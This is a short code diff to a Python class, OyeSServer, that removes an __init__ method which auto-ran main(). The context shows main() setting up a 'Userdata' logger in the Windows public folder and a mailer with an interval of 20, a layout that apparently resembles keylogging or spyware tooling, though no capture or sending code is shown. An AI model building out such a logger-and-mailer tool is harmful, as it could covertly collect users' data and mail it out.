@@ -10,9 +10,6 @@ class OyeSServer:
     mailer = None
     server = None
 
-    def __init__(self):
-        self.main()
-
     def main(self):
         self.logger = Logger("C:\\Users\\Public\\", "Userdata")
         self.mailer = Mailer(self, 20)
